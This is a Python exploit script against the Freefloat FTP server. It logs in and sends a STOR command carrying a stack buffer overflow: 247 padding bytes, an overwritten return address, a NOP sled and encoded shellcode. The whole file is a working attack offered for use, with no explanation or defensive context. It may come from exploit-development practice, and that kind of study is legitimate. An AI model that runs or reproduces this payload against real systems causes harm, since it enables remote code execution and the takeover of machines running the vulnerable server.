#!/usr/bin/python3

import socket

class Freefloat():

	def __init__(self, ip = '127.0.0.1', port = 4444):
		self.ip = ip
		self.port = port 

		self.uhoh = '\x00\x0a\x0d'

		self.shellcode = (b"\xd9\xc0\xbd\x61\x90\x35\x59\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
		b"\x52\x83\xee\xfc\x31\x6e\x13\x03\x0f\x83\xd7\xac\x33\x4b\x95"
		b"\x4f\xcb\x8c\xfa\xc6\x2e\xbd\x3a\xbc\x3b\xee\x8a\xb6\x69\x03"
		b"\x60\x9a\x99\x90\x04\x33\xae\x11\xa2\x65\x81\xa2\x9f\x56\x80"
		b"\x20\xe2\x8a\x62\x18\x2d\xdf\x63\x5d\x50\x12\x31\x36\x1e\x81"
		b"\xa5\x33\x6a\x1a\x4e\x0f\x7a\x1a\xb3\xd8\x7d\x0b\x62\x52\x24"
		b"\x8b\x85\xb7\x5c\x82\x9d\xd4\x59\x5c\x16\x2e\x15\x5f\xfe\x7e"
		b"\xd6\xcc\x3f\x4f\x25\x0c\x78\x68\xd6\x7b\x70\x8a\x6b\x7c\x47"
		b"\xf0\xb7\x09\x53\x52\x33\xa9\xbf\x62\x90\x2c\x34\x68\x5d\x3a"
		b"\x12\x6d\x60\xef\x29\x89\xe9\x0e\xfd\x1b\xa9\x34\xd9\x40\x69"
		b"\x54\x78\x2d\xdc\x69\x9a\x8e\x81\xcf\xd1\x23\xd5\x7d\xb8\x2b"
		b"\x1a\x4c\x42\xac\x34\xc7\x31\x9e\x9b\x73\xdd\x92\x54\x5a\x1a"
		b"\xd4\x4e\x1a\xb4\x2b\x71\x5b\x9d\xef\x25\x0b\xb5\xc6\x45\xc0"
		b"\x45\xe6\x93\x47\x15\x48\x4c\x28\xc5\x28\x3c\xc0\x0f\xa7\x63"
		b"\xf0\x30\x6d\x0c\x9b\xcb\xe6\x39\x5c\xd3\xf1\x55\x5e\xd3\xfc"
		b"\x1e\xd7\x35\x94\x70\xbe\xee\x01\xe8\x9b\x64\xb3\xf5\x31\x01"
		b"\xf3\x7e\xb6\xf6\xba\x76\xb3\xe4\x2b\x77\x8e\x56\xfd\x88\x24"
		b"\xfe\x61\x1a\xa3\xfe\xec\x07\x7c\xa9\xb9\xf6\x75\x3f\x54\xa0"
		b"\x2f\x5d\xa5\x34\x17\xe5\x72\x85\x96\xe4\xf7\xb1\xbc\xf6\xc1"
		b"\x3a\xf9\xa2\x9d\x6c\x57\x1c\x58\xc7\x19\xf6\x32\xb4\xf3\x9e"
		b"\xc3\xf6\xc3\xd8\xcb\xd2\xb5\x04\x7d\x8b\x83\x3b\xb2\x5b\x04"
		b"\x44\xae\xfb\xeb\x9f\x6a\x1b\x0e\x35\x87\xb4\x97\xdc\x2a\xd9"
		b"\x27\x0b\x68\xe4\xab\xb9\x11\x13\xb3\xc8\x14\x5f\x73\x21\x65"
		b"\xf0\x16\x45\xda\xf1\x32")

		self.buffer = b'A' * 247
		self.eip = b'\x5b\x4e\x3c\x77' 
		self.nop_sled = b'\x90' * 24 
		self.final_pad = b'C' * (700 - len(self.buffer) - len(self.eip) - len(self.nop_sled) - len(self.shellcode))
		self.attack_string = self.buffer + self.eip + self.nop_sled + self.shellcode + self.final_pad

	def exploit(self):

            results = []

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                results.append('[*] Connecting to the server')	
                s.connect((self.ip,self.port))
                s.recv(1024)

                results.append('[*] Sending the user')
                s.send(b'USER doink\r\n')
                s.recv(1024)

                results.append('[*] Sending the password')
                s.send(b'PASS letmein\r\n')
                s.recv(1024)

                results.append('[*] Sending payload')
                s.send(b'STOR' + self.attack_string + b'\r\n')

                s.close()

            except Exception as e:
                results.append('[-] ' + str(e))

            finally:
                return results
